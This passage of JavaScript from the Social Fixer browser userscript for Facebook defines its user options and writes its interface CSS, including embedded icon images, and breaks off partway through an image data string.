						a('dont_hide_posts_on_profiles','checkbox',false);
						a('left_align','checkbox',false );
						a('pin_notifications','checkbox',false );
						a('pin_notifications_right_panel','checkbox',false );
						a('pin_notifications_width','input','',{size:5} );
						a('auto_click_more_times','input',3,{size:2},'padding:0;width:20px;font-size:11px;');
						a('auto_click_older_posts','checkbox',false );
						a('disable_scroll_load','checkbox',true);
						a('older_posts_selector','input','.fbOlderPosts, .uiMorePager a.lfloat, .uiMorePager a.uiMorePagerPrimary, #profile_pager_container .uiMorePager, #profile_pager_container .uiMorePagerPrimary',{size:50});
						a('reload_when_mark_all_read','checkbox',false );
						a('auto_mute_count','input',0,{size:3} );
						a('auto_mute_all','checkbox',false );
						a('hide_update_email','checkbox',false );
						a('reorder','checkbox',false);
						a('reorder_tabbed','checkbox',false);
						a('char_counter_max2','input','5000',{size:5});
						a('static_left_col','checkbox',false);
						a('hide_notification_pictures','checkbox',false);
						a('show_post_actions','checkbox',true);
						a('post_action_opacity2','input','.5',{size:3});
						a('post_action_zoom','input','100',{size:3});
						a('hide_post_actions_until_hover','checkbox',true);
						a('show_notification_previews2','checkbox',false);
						a('float_control_panel','checkbox',false);
						a('floating_cp_opacity','input','.75',{size:3});
						a('floating_cp_offset','input','0',{size:2});
						a('hide_hovercard','checkbox',false);
						a('cp_button_mark_all_read','checkbox',true);
						a('cp_button_show_hide_all','checkbox',true);
						a('cp_button_mute_all','checkbox',true);
						a('cp_button_reload','checkbox',true);
						a('cp_button_undo','checkbox',true);
						a('auto_expand_comments','checkbox',false);
						a('expand_see_more','checkbox',true);
						a('chat_images_to_names','checkbox',false);
						a('enable_font_size','checkbox',false);
						a('post_font_size','input','13',{size:3},'padding:0;width:20px;font-size:11px;');
						a('comment_font_size','input','13',{size:3},'padding:0;width:20px;font-size:11px;');
						a('stretch_wide','checkbox',false);
						a('show_image_previews','checkbox',true);
						a('image_preview_delay','input','.5',{size:3});
						a('image_preview_position','hidden','');
						a('image_preview_show_footnote','hidden',true);
						a('fix_timestamps','checkbox',true);
						a('disable_theater_view','checkbox',false);
						a('fix_comments','checkbox',false);
						a('undo_ctrl_z','checkbox',true);
						a('fix_comment_cursor','checkbox', (SCRIPT_TYPE=="greasemonkey" || SCRIPT_TYPE=="firefox_addon" || SCRIPT_TYPE=="firefox_addon_official") );
						a('fix_comment_wrap','checkbox',false);

						// Comment replies
						a('comment_reply','checkbox',true);
						a('comment_reply_tag','checkbox',true);
						a('comment_reply_float_textarea','checkbox',true);
						a('comment_reply_first_name_only','checkbox',false);

						// post actions
						a('show_post_action_info','checkbox',true);
						a('show_post_action_google','checkbox',true);
						a('show_post_action_mark_unread','checkbox',true);
						a('show_post_action_info_mute','checkbox',true);
						a('show_post_action_info_mark_read','checkbox',true);
						a('show_post_action_info_add_app','checkbox',true);
						a('show_post_action_save','checkbox',true);

						// Chat
						a('chat_disable_sidebar','checkbox',false);
						a('chat_force_offline','checkbox',false);
						a('chat_hide','checkbox',false);
						a('chat_show_all_online','checkbox',true);
						a('chat_compact','checkbox',false);
						a('chat_group_by_status','checkbox',true);
						a('chat_hide_mobile_users','checkbox',false);
						
						// ADVANCED
						a('fix_logo2','checkbox',true);
						a('home_url','input','/',{size:20} );
						a('preview_img_max_width2','input','400',{size:4} );
						a('preview_img_max_height2','input','300',{size:4} );
						a('show_options_save_message','checkbox',true);
						a('comment_expire_days','input','14',{size:4} );
						a('open_app_link_in_tab','checkbox',false);
						a('open_app_link_marks_read','checkbox',false);
						a('mark_read_on_comment','checkbox',false);
						a('allow_bfb_formatting','checkbox',true);
						a('auto_subscribe_news','checkbox',true);
						a('auto_subscribe_news_done','checkox',false);
						a('console_logging_enabled','checkbox',true);
						a('highlight_sfx_news','checkbox',true);

						// PAGELETS
						a('sfx_donated','hidden',false);
						a('sfx_no_donate2','hidden',false);
						a('sfx_donate_check_time2','hidden',0);
						a('check_for_messages2','checkbox',true);
						a('last_message_check','hidden',0);
						a('message_check_interval2','input',180,{size:5});
						a('last_message_id','hidden',0);
						a('show_message','hidden',true);
						a('tips_of_the_day','checkbox',true);
						a('tips_show_after','hidden',0);
						a('tips_last_id','hidden',0);
						a('show_update','hidden',true);
						
						// MISC
						a('show_version_changes','checkbox',true );
						a('check_for_updates2','checkbox',true );
						a('check_for_beta_updates','checkbox',false );
						a('update_check_interval2','input','12',{size:3} );
						a('debug','checkbox',false );
						
						// Hidden elements
						a('hidden_elements','input','',{size:80});
						a('hidden_elements_x','input','',{size:80});
						
						// CSS
						a('css_url','input','',{size:50} );
						a('css','textarea','',{rows:25,cols:80} );
						a('theme_url2','input','',{size:60});

						// FEED FILTER
						a('always_show_tabs','checkbox',false);
						a('tab_all_apps','checkbox',true);
						a('tab_count','checkbox',true);
						a('filters','hidden',[]);
						a('filters_enabled','checkbox',true);
						a('custom_apps','input','',{size:80});
						a('untab_apps','input','',{size:80});
						a('filter_profiles','checkbox',true);
						
						a('friend_list_interval','input',1,{size:3} );
						a('prevent_link_redirection','checkbox',false);
						a('fix_social_news_links','checkbox',true);
						
						// TIMELINE
						a('timeline_show_panel','checkbox',true);
						a('timeline_hide_cover_photo','checkbox',false);
						a('timeline_hide_friends_box','checkbox',false);
						a('timeline_hide_maps','checkbox',false);
						a('timeline_single_column','checkbox',false);
						a('timeline_single_column_width','input','',{size:4});
						a('timeline_white_background','checkbox',false);

						// Hidden options
						a('version','hidden',0 );
						a('version_ack','hidden',0 );
						a('last_update_check','hidden',0 );
						a('last_msg2','hidden',0 );
						a('installed_on_5','hidden',0 );
						a('last_cleaned_on','hidden',0);
					}	

					// Handle console logging right away
					if (!options.get('console_logging_enabled')) {
						log("Social Fixer console logging disabled. Suspended further logging.");
						console_logging_enabled = false;
					}
					
					// Don't run on Apps?
					if (!options.get('enable_on_apps') && host=="apps.facebook.com") { return; }
					
					// ===================================================
					// POWERED OFF?
					// ===================================================
					var setScrollLoadStatus = function() {
						if (options.get('disabled') || !options.get('disable_scroll_load')) {
							setScrollLoad(true); 	
						}
						else {
							setScrollLoad(false); 	
						}
					};
					setScrollLoadStatus();
					setInterval(setScrollLoadStatus,1000);
					//subscribe('NavigationMessage/navigationFirstResponse',setScrollLoadStatus);

					// ==================================================================
					// CSS - Write out ASAP
					// ==================================================================
					(function() {  // Wrapped for code collapsing and to early exit
						// Options button CSS, which is visible even if disabled
						var css = '\n	/* Options */\n	#bfb_options_button { height:29px !important; padding:4px 4px 0 !important; }\n	#bfb_options_button_li { position:relative; }\n	#bfb_options_button_li ul {\n		background: none repeat scroll 0 0 #FFFFFF !important;\n		border-color: #333333 #333333 #2D4486 !important;\n		border-style: solid !important;\n		border-width: 1px 1px 2px !important;\n		display: none !important;\n		margin-right: -1px !important;\n		margin-top: -1px !important;\n		min-width: 200px !important;\n		padding: 4px 0 !important;\n		position: absolute !important;\n		right: 0 !important;\n		top: 100% !important;\n		z-index: 1 !important;\n	}\n	#bfb_options_button_li ul a {\n		border-bottom: 1px solid #FFFFFF !important;\n		border-top: 1px solid #FFFFFF !important;\n		color: #222222 !important;\n		height: 18px !important;\n		line-height: 18px !important;\n		padding: 0 22px !important;\n		display:block;\n		font-weight:normal;\n		white-space:nowrap;\n		text-decoration:none;\n	}\n	#bfb_options_button_li ul a:hover {\n		color:white !important;\n		background-color:#6d84b4 !important;\n		border-top: 1px solid #3b5998 !important;\n		border-bottom: 1px solid #3b5998 !important;\n	}\n	#bfb_options_button_li.openToggler ul { display:block !important; }\n	#bfb_options_button_li.openToggler > a >img { \n		background-color:white !important;\n	}\n	#bfb_options_button_li li { display:block !important; float:none !important; }\n	#bfb_options_button_icon { border:1px solid #A7B4D1; border-radius:4px; -moz-border-radius:4px; -webkit-border-radius:4px; }\n	#bfb_error_list { max-height:300px; overflow:auto; max-width:300px;  }\n	.bfb_error { cursor:pointer; margin:5px 10px; border:2px solid #F03D25; border-radius:5px; -moz-border-radius:5px; -webkit-border-radius:5px; color:black; padding:3px;  }\n	div.bfb_error:hover { background-color: #F03D25; color:white; }\n	\n	/* Make sure the "Enabled Social Fixer" menu item displays correctly */\n	#bfb_option_list.disabled a { width: 100% !important; padding: 0 !important; text-align: center !important; }\n	\n	#bfb_option_list a:after { content: none !important; }\n						';
						add_css(css);

						if (options.get('disabled')) { return; }

						// Core CSS
						var css = '\n	.sfx_hidden { display:none !important; }\n	\n	.better_fb_cp { \n		padding:2px 5px 2px 25px; \n		border:1px solid #EDEFF4; \n		margin:8px 0px 6px 0px; \n		background-color:white; \n		z-index:0; \n		position:relative;\n		background: white url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8%2F9hAAAACXBIWXMAAC4jAAAuIwF4pT92AAAKTWlDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVN3WJP3Fj7f92UPVkLY8LGXbIEAIiOsCMgQWaIQkgBhhBASQMWFiApWFBURnEhVxILVCkidiOKgKLhnQYqIWotVXDjuH9yntX167%2B3t%2B9f7vOec5%2FzOec8PgBESJpHmomoAOVKFPDrYH49PSMTJvYACFUjgBCAQ5svCZwXFAADwA3l4fnSwP%2FwBr28AAgBw1S4kEsfh%2F4O6UCZXACCRAOAiEucLAZBSAMguVMgUAMgYALBTs2QKAJQAAGx5fEIiAKoNAOz0ST4FANipk9wXANiiHKkIAI0BAJkoRyQCQLsAYFWBUiwCwMIAoKxAIi4EwK4BgFm2MkcCgL0FAHaOWJAPQGAAgJlCLMwAIDgCAEMeE80DIEwDoDDSv%2BCpX3CFuEgBAMDLlc2XS9IzFLiV0Bp38vDg4iHiwmyxQmEXKRBmCeQinJebIxNI5wNMzgwAABr50cH%2BOD%2BQ5%2Bbk4eZm52zv9MWi%2FmvwbyI%2BIfHf%2FryMAgQAEE7P79pf5eXWA3DHAbB1v2upWwDaVgBo3%2FldM9sJoFoK0Hr5i3k4%2FEAenqFQyDwdHAoLC%2B0lYqG9MOOLPv8z4W%2Fgi372%2FEAe%2Ftt68ABxmkCZrcCjg%2F1xYW52rlKO58sEQjFu9%2Bcj%2FseFf%2F2OKdHiNLFcLBWK8ViJuFAiTcd5uVKRRCHJleIS6X8y8R%2BW%2FQmTdw0ArIZPwE62B7XLbMB%2B7gECiw5Y0nYAQH7zLYwaC5EAEGc0Mnn3AACTv%2FmPQCsBAM2XpOMAALzoGFyolBdMxggAAESggSqwQQcMwRSswA6cwR28wBcCYQZEQAwkwDwQQgbkgBwKoRiWQRlUwDrYBLWwAxqgEZrhELTBMTgN5%2BASXIHrcBcGYBiewhi8hgkEQcgIE2EhOogRYo7YIs4IF5mOBCJhSDSSgKQg6YgUUSLFyHKkAqlCapFdSCPyLXIUOY1cQPqQ28ggMor8irxHMZSBslED1AJ1QLmoHxqKxqBz0XQ0D12AlqJr0Rq0Hj2AtqKn0UvodXQAfYqOY4DRMQ5mjNlhXIyHRWCJWBomxxZj5Vg1Vo81Yx1YN3YVG8CeYe8IJAKLgBPsCF6EEMJsgpCQR1hMWEOoJewjtBK6CFcJg4Qxwicik6hPtCV6EvnEeGI6sZBYRqwm7iEeIZ4lXicOE1%2BTSCQOyZLkTgohJZAySQtJa0jbSC2kU6Q%2B0hBpnEwm65Btyd7kCLKArCCXkbeQD5BPkvvJw%2BS3FDrFiOJMCaIkUqSUEko1ZT%2FlBKWfMkKZoKpRzame1AiqiDqfWkltoHZQL1OHqRM0dZolzZsWQ8ukLaPV0JppZ2n3aC%2FpdLoJ3YMeRZfQl9Jr6Afp5%2BmD9HcMDYYNg8dIYigZaxl7GacYtxkvmUymBdOXmchUMNcyG5lnmA%2BYb1VYKvYqfBWRyhKVOpVWlX6V56pUVXNVP9V5qgtUq1UPq15WfaZGVbNQ46kJ1Bar1akdVbupNq7OUndSj1DPUV%2Bjvl%2F9gvpjDbKGhUaghkijVGO3xhmNIRbGMmXxWELWclYD6yxrmE1iW7L57Ex2Bfsbdi97TFNDc6pmrGaRZp3mcc0BDsax4PA52ZxKziHODc57LQMtPy2x1mqtZq1%2BrTfaetq%2B2mLtcu0W7eva73VwnUCdLJ31Om0693UJuja6UbqFutt1z%2Bo%2B02PreekJ9cr1Dund0Uf1bfSj9Rfq79bv0R83MDQINpAZbDE4Y%2FDMkGPoa5hpuNHwhOGoEctoupHEaKPRSaMnuCbuh2fjNXgXPmasbxxirDTeZdxrPGFiaTLbpMSkxeS%2BKc2Ua5pmutG003TMzMgs3KzYrMnsjjnVnGueYb7ZvNv8jYWlRZzFSos2i8eW2pZ8ywWWTZb3rJhWPlZ5VvVW16xJ1lzrLOtt1ldsUBtXmwybOpvLtqitm63Edptt3xTiFI8p0in1U27aMez87ArsmuwG7Tn2YfYl9m32zx3MHBId1jt0O3xydHXMdmxwvOuk4TTDqcSpw%2BlXZxtnoXOd8zUXpkuQyxKXdpcXU22niqdun3rLleUa7rrStdP1o5u7m9yt2W3U3cw9xX2r%2B00umxvJXcM970H08PdY4nHM452nm6fC85DnL152Xlle%2B70eT7OcJp7WMG3I28Rb4L3Le2A6Pj1l%2Bs7pAz7GPgKfep%2BHvqa%2BIt89viN%2B1n6Zfgf8nvs7%2Bsv9j%2Fi%2F4XnyFvFOBWABwQHlAb2BGoGzA2sDHwSZBKUHNQWNBbsGLww%2BFUIMCQ1ZH3KTb8AX8hv5YzPcZyya0RXKCJ0VWhv6MMwmTB7WEY6GzwjfEH5vpvlM6cy2CIjgR2yIuB9pGZkX%2BX0UKSoyqi7qUbRTdHF09yzWrORZ%2B2e9jvGPqYy5O9tqtnJ2Z6xqbFJsY%2BybuIC4qriBeIf4RfGXEnQTJAntieTE2MQ9ieNzAudsmjOc5JpUlnRjruXcorkX5unOy553PFk1WZB8OIWYEpeyP%2BWDIEJQLxhP5aduTR0T8oSbhU9FvqKNolGxt7hKPJLmnVaV9jjdO31D%2BmiGT0Z1xjMJT1IreZEZkrkj801WRNberM%2FZcdktOZSclJyjUg1plrQr1zC3KLdPZisrkw3keeZtyhuTh8r35CP5c%2FPbFWyFTNGjtFKuUA4WTC%2BoK3hbGFt4uEi9SFrUM99m%2Fur5IwuCFny9kLBQuLCz2Lh4WfHgIr9FuxYji1MXdy4xXVK6ZHhp8NJ9y2jLspb9UOJYUlXyannc8o5Sg9KlpUMrglc0lamUycturvRauWMVYZVkVe9ql9VbVn8qF5VfrHCsqK74sEa45uJXTl%2FVfPV5bdra3kq3yu3rSOuk626s91m%2Fr0q9akHV0IbwDa0b8Y3lG19tSt50oXpq9Y7NtM3KzQM1YTXtW8y2rNvyoTaj9nqdf13LVv2tq7e%2B2Sba1r%2Fdd3vzDoMdFTve75TsvLUreFdrvUV99W7S7oLdjxpiG7q%2F5n7duEd3T8Wej3ulewf2Re%2FranRvbNyvv7%2ByCW1SNo0eSDpw5ZuAb9qb7Zp3tXBaKg7CQeXBJ9%2BmfHvjUOihzsPcw83fmX%2B39QjrSHkr0jq%2Fdawto22gPaG97%2BiMo50dXh1Hvrf%2Ffu8x42N1xzWPV56gnSg98fnkgpPjp2Snnp1OPz3Umdx590z8mWtdUV29Z0PPnj8XdO5Mt1%2F3yfPe549d8Lxw9CL3Ytslt0utPa49R35w%2FeFIr1tv62X3y%2B1XPK509E3rO9Hv03%2F6asDVc9f41y5dn3m978bsG7duJt0cuCW69fh29u0XdwruTNxdeo94r%2Fy%2B2v3qB%2FoP6n%2B0%2FrFlwG3g%2BGDAYM%2FDWQ%2FvDgmHnv6U%2F9OH4dJHzEfVI0YjjY%2BdHx8bDRq98mTOk%2BGnsqcTz8p%2BVv9563Or59%2F94vtLz1j82PAL%2BYvPv655qfNy76uprzrHI8cfvM55PfGm%2FK3O233vuO%2B638e9H5ko%2FED%2BUPPR%2BmPHp9BP9z7nfP78L%2FeE8%2Fsl0p8zAAAABGdBTUEAALGOfPtRkwAAACBjSFJNAAB6JQAAgIMAAPn%2FAACA6QAAdTAAAOpgAAA6mAAAF2%2BSX8VGAAAC%2FklEQVR42oSTzWuUVxTGn3PvfT9m5p2POGMmGeNMJEZFpJRGS3BaW2ituFFcVEGwCIL%2FgTsXuhWx4EIspRXsomitVLAUCm0apISq1VSJikRNk5ikMZnMZDJf733vvV1MprbMog%2Bc5fk98Dzn0Bv7zqNNBEgZ4IPBPuQHcl2uI95fEw9v5ZzY%2BJ%2BFsYVC5UcvbC%2FKQENwRm37BgCB0JdNHh3Ytu4MEa2FMWCMIZtJ4OXc8s%2B%2F%2Fj6xv%2BGrFbG%2BO94GUEojtSayfne%2B7yIROUppEFFQLFaHx8b%2FujS%2FuPLT7T%2Bmq7W6hNi8IdUGaMgAb27p3hcO2Y4vFYhg7j6cPlwo1b55VajAwKAz6SHTGYPwIk4bwA0Est2JXcYYAIAlOJUrjfTo41nEow7SySh6tsShtAbjjPDvYQSEXBFOxEODSjcBWhts3dh5xOKMIq6NVmycsy5RrjT%2B4y6lQjaT2BmPulmldDMTrZFOeduzmcQg4%2FSit6fjQF82%2BUmtLktiqVSDgQFRE1uvB8gP5A5xRlBqtRUDMCK2Z1f%2F14IzzwvbSdviGLk%2FdU5MvFwCZ4SGVPB9hd6ejo39vamDwap7S9oYRCNOzhiAiDA5U3pwc%2BjJafHejg1wHAuTs0UQwd777qYLXtiO%2BVK9vitqZqO0AecMQaAXP7965%2FDjZ%2FPLIuRY0AB60jHno3z%2FFS9i724tc0ZgjGGl2ihJqZcSMbdXa%2B1fun7v40fP5scsi0NIpZCIhSK5TOLbWMzZ4%2FtqtTqGhaXqo9lX5c%2BmZ0vX5xbK6eOH3r715bXRY1e%2BfzAUCdsgIohA6Xh%2BIHfNtcWHvq9ABAjBMT6x8OnI6NRJL2RXKzUfv%2Fz2Yq7uq713H04Pp1NRsNUuRf6t3M2QI96RgQYRYFscPww%2FPTE5UzzrOhYcW6CwXEWxXA%2BGbj8fDqQG56%2F%2Fh63riu%2BQQTNxxxYYGZ06%2FdWN%2B2e1MWg9GhGBMYJri3%2BcWxJK6RkAHbbg5tadiS8uf3fvlCU4SssNxCIu%2Fk9%2FDwDPAzZNZxpPbwAAAABJRU5ErkJggg%3D%3D") no-repeat 2px 1px;\n	}\n	.better_fb_cp_more_less {\n		float:right;\n		cursor:pointer;\n		color:#D8DFEA;\n		margin-right:13px;\n	}\n	.better_fb_cp > label > input {\n		color:#777 !important;\n	}\n	.better_fb_cp .sfx_cp_version {\n		font-size:8px;\n		color:#3B5998;\n		position:absolute;\n		top:12px;\n		left:3px;\n		font-family:arial;\n	}\n\n	/* Hide the status line by default, unless expanded */\n	#bfb_status {\n		display:none;\n	}\n	.better_fb_cp_more ~ #bfb_status {\n		display:block;\n	}\n	.better_fb_cp legend { font-size:9px; color:#3B5998; background-color:white; }\n	.bfb_cp_float { position:relative; z-index:14; opacity:.75; -moz-box-shadow:5px 5px 5px #999; -webkit-box-shadow:5px 5px 5px #999; border:2px solid #ccc; }\n	.bfb_cp_float:hover { opacity:1; }\n\n	.bfb_new_comment_notif { display:none; }\n	.bfb_read, \n	.bfb_read ~ .spinePointer \n		{ display:none !important; }\n	.bfb_new_comments, \n	.bfb_new_comments .bfb_new_comment_notif, \n	.bfb_new_comments ~ .spinePointer \n		{ display:block !important; }\n	.bfb_hidden,\n	.bfb_hidden ~ .spinePointer, \n	.bfb_duplicate \n		{ display:none !important; }\n	.sfx_tabbed { display:none !important; }\n	\n	.bfb_read:not(.bfb_new_comments):after{content:"(This post was hidden because it was marked read)";font-size:10px;font-style:italics;color:#666;}\n	.bfb_muted:not(.bfb_new_comments):after{content:"(This post was hidden because it was muted)";font-size:10px;font-style:italics;color:#666;}\n\n	/* Make sure that show all actually shows all */\n	.bfb_show_all .bfb_processed:not(.sfx_tabbed),\n	.bfb_show_all .sfx_trending_articles\n		{ display:block !important; }\n	.bfb_show_all .bfb_read:not(.bfb_new_comments) {\n		background-color:#f6f6f6 !important;\n	}\n	.bfb_show_all .bfb_duplicate { display:block !important; opacity:.2; }\n\n\n	.bfb_minimized img, .bfb_minimized .comments_add_box { display:none; }\n	.bfb_processed.sfx_sponsored { display:none !important; }\n	.sfx_trending_articles { display:none !important; }\n\n	.bfb_minimized > *, .bfb_minimized { min-height:0px !important; padding-bottom:0px; padding-left:0px !important; }\n	.bfb_minimized * { margin:0 !important; }\n	.bfb_minimized .uiStreamMessage, .bfb_minimized .GenericStory_Message { padding-left:0px !important; }\n	.bfb_minimized .UIStoryAttachment { margin:0px !important; }\n	\n	.bfb_undid { background-color:#ffffcc; }\n\n	.bfb_hideable .bfb_hide_el { display:none; cursor:pointer; background:transparent url("data:image/gif,GIF89a%0B%00%0B%00%91%00%00%00%00%00%FF%FF%FF%9C%9A%9C%FF%FF%FF!%F9%04%01%00%00%03%00%2C%00%00%00%00%0B%00%0B%00%00%02%18%94%8F6%CB%AC%BA%9E%18%87%CA%88%B0%83%16%D7%5E%85%13w5M%82%0A%05%00%3B") no-repeat center center; width:11px; height:11px; }\n	.bfb_hide_menu { display:none; position:absolute; margin-top:5px; right:0px; background-color:white; border:1px solid black; color:black; min-width:150px; }\n	.bfb_hide_menu div.bfb_item { color:#3A579A; padding:4px 10px 5px; white-space:nowrap; font-weight:normal; }\n	.bfb_hide_menu div.bfb_item:hover { background-color:#6D84B4; color:white; padding:3px 10px 4px; border-bottom:1px solid #3B5998; border-top: 1px solid #3B5998; }\n	.bfb_hideable .bfb_hide_el.bfb_show_menu .bfb_hide_menu { display:block; }\n	.bfb_hideable:hover .bfb_hide_el { display:block; }\n	.bfb_hideable_hover { border:3px solid red; }\n	.bfb_frame { border:2px solid red; background-color:#ccc; opacity:.3; position:absolute; top:0px; left:0px; z-index:999; }\n\n	.UIButton_better_fb { margin:0px 3px !important; padding:0px 4px !important; }\n\n	.bfb_new_comment_notif { width:350px; background-color:#edeff4 !important; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px; font-size:11px; line-height:16px; padding:1px 0px 1px 5px !important; color:black; font-weight:bold; border:1px solid #aaa !important; border-right-color:#666 !important; border-bottom-color:#666 !important; border-right-width:2px !important; border-bottom-width:2px !important; }\n\n	/* Post modifications */\n	.bfb_reply_link:before { content:" - "; }\n	.bfb_floating_comment { position:absolute !important; width:400px !important; z-index:999999 !important; border:1px solid #999 !important; -moz-box-shadow:5px 5px 5px #999; -webkit-box-shadow:5px 5px 5px #999;}\n	.bfb_reply_active_comment { border:1px solid #999; }\n	.bfb_reply_commented .bfb_reply_link { padding-right:14px; background:transparent url("data:image/gif,GIF89a%0C%00%0C%00%91%03%00%7B%D6z%00f%00%00%99%00%00%00%00!%F9%04%01%00%00%03%00%2C%00%00%00%00%0C%00%0C%00%00%02%1D%9C%8F%A9%23%7B%02%DA%82%22%CCh%99d%D8%04%10q%15%12P%5DR%9EJ%999%AD%E3%14%00%3B") no-repeat right center; }\n	.bfb_reply_note { font-size:9px; color:#666; }\n	\n	/* Post Actions */\n	.bfb_post_action_container { opacity:.5; display:block; position:absolute; z-index:14; top:0px; right:30px; padding:0; background-color:white; }\n	.timelineUnitContainer .bfb_post_action_container { right:65px; top:15px; }\n	.bfb_post_action_container:hover { opacity:1;  }\n	.uiUnifiedStory:hover .bfb_post_action_container, .mall_post:hover .bfb_post_action_container, .timelineUnitContainer:hover .bfb_post_action_container { display:block; }\n	.bfb_post_action { background:transparent url("data:image/gif;base64,R0lGODlhaQAeALMAANEAAJity%2BTm6dfZ3KW10NfZ3cDF0NbY3Nja3sbL0tjZ3a291mWEsv%2F%2F%2FwAAAAAAACwAAAAAaQAeAAAE%2F7DJSau9OOvNu%2F%2BgtYwkRZ6nNaBFaKKoKzfwKC0bPpFCI5QYmIlGHOo0Nk5SVLvRlqXjqfcDVpJLJ%2B6ozWWD2dgTqItiJasaycC8cYnqLfJ7sY7JqeJd6uYJqnZugkNIGYF1X0J7TjthfSNUYleHW2p6eoeMDQwMOpx9YJqSZVM%2BkpN1lzuXNpmCC5wMm59joUVmZY8LkXmTdHIirL2IJLG0e6RktaDJkKYkBG1PV6pdL2%2FEErHXeMqFDQqlgAsJqKtGqdjYQdrGjXmjUMNTf8OD00aW6yDb28i65vYhc3VKE7sZ7SbQimNvmsAGB1AgQMjwIcKLri4iDGCso7EAHP89egQpcmTIkrFIokx5cqXKlQxawpy50oI7DSJR0ES5YadPnhc%2BwZzFqVjREUApuJMTA8fMdkOJdsQgVOExWbFOZDU6dRbUT0xTOK35taTVY%2FcSXrVKtKLIhFJlCRxrtuzbr9LY%2Bjs7S%2BdRrv5oTa0Y92Zhj2fRpvVq2N1fpI9hIU4M1pBUopT7cQIAYBbnY5YYK9bst5PWu28rNb28KXPgBpwBMIgNuolohXpNcy1tuDAcIXRlKU0qIfZnxfj08tXW97TuBQQmC146kEjXw9c3H0f%2BRWjNrZCfS9e8TbVY3zs9G9%2FbqMJe9lKdOw88vbzlnyJp0xb%2Bwv1N7zmpUVcnZgOlgJ9H2x3XgXTYgRfegfxRFRNNL7kkU0kV8tdRhhheKBKHH0YAADs%3D") no-repeat 0 0; }\n	.bfb_post_action { text-align:center; float:right; width:15px; display:inline; height:15px; margin:0px 2px; cursor:pointer; }\n	.bfb_post_action_read { background-position:0 0; }\n	.bfb_post_action_read:hover { background-position:0 -15px; }\n	.bfb_post_action_unread { display:none; background-position:-15px 0; }\n	.bfb_read .bfb_post_action_unread { display:block; }\n	.bfb_post_action_unread:hover { background-position:-15px -15px; }\n	.bfb_post_action_mute { background-position:-45px 0; }\n	.bfb_post_action_mute:hover { background-position:-45px -15px; }\n	.bfb_post_action_add { background-position:-30px 0; }\n	.bfb_post_action_add:hover { background-position:-30px -15px; }\n	.bfb_post_action_info { background-position:-60px 0; }\n	.bfb_post_action_info:hover { background-position:-60px -15px; }\n	.bfb_post_action_google { background-position:-75px 0; }\n	.bfb_post_action_google:hover { background-position:-75px -15px; }\n	.bfb_post_action_save { background-position:-90px 0; }\n	.bfb_post_action_save:hover { background-position:-90px -15px; }\n	.timelinePhotoMove .bfb_post_action_container { display:none !important; } /* Don\'t show post actions when repositioning photos */\n	/* Post actions in trending articles */\n	.uiStreamStoryAttachmentOnly div.bfb_post_action_container { top: 32px !important; }\n\n	/* Save for Later */\n	.sfx_dialog_save_later { background-color:white; border:2px solid #EE4056; border-radius:5px; -moz-border-radius:5px; -webkit-border-radius:5px; position:fixed; top:45px; left:10px; z-index:999999; -moz-box-shadow:10px 10px 10px #999; -webkit-box-shadow:10px 10px 5px #999; }\n	.sfx_dialog_save_later_header { padding-left:10px; height:20px; background-color:#EE4056; font-weight:bold; color:white; line-height:18px; font-size:16px; font-family:arial; }\n	.sfx_dialog_save_later_body { width:350px; height:320px; border:none; border:1px solid white;}\n	.sfx_dialog_save_later_footer { border-top:1px solid #EE4056; height:20px; }\n	.sfx_dialog_save_later_alt { float:right; cursor:pointer; text-decoration:underline; font-size:10px;color:#EE4056; margin-right:5px; }\n\n	/* Help Popup */\n	.bfb_help { background:transparent url("data:image/gif,GIF89a%10%00%10%00%F7%00%00%00%FF%00%10J%B5%10R%B5%10R%C6%10R%D6%10Z%D6!R%C6!Z%B5!Z%C6!Z%E7!c%F7!k%F7!k%FF1Z%8C1k%FF1s%FF9Z%8CBs%A5Bs%FFB%7B%F7B%7B%FFJk%94J%84%D6Rk%94Rs%9CR%7B%C6R%84%D6R%84%E7R%84%F7R%84%FFR%8C%D6R%8C%F7R%8C%FFZ%84%9CZ%8C%D6c%8C%C6c%8C%D6c%94%C6c%94%F7c%94%FFk%84%ADk%9C%D6s%8C%9Cs%94%ADs%94%B5s%94%F7s%9C%C6s%9C%D6s%9C%F7s%9C%FFs%A5%E7%7B%94%94%7B%9C%AD%7B%A5%D6%84%A5%D6%84%AD%D6%84%AD%E7%84%AD%FF%8C%B5%E7%94%9C%9C%94%9C%A5%94%AD%BD%94%AD%C6%94%AD%E7%94%AD%F7%94%B5%FF%A5%BD%CE%A5%BD%D6%A5%BD%DE%A5%BD%E7%A5%BD%F7%A5%BD%FF%A5%C6%FF%AD%C6%DE%B5%C6%D6%B5%C6%F7%B5%CE%E7%B5%CE%F7%B5%CE%FF%BD%BD%BD%BD%C6%C6%BD%C6%CE%C6%CE%D6%C6%CE%E7%C6%D6%DE%C6%D6%F7%C6%D6%FF%C6%DE%F7%CE%DE%E7%DE%DE%E7%E7%EF%F7%E7%F7%F7%E7%F7%FF%F7%F7%F7%F7%F7%FF%F7%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%F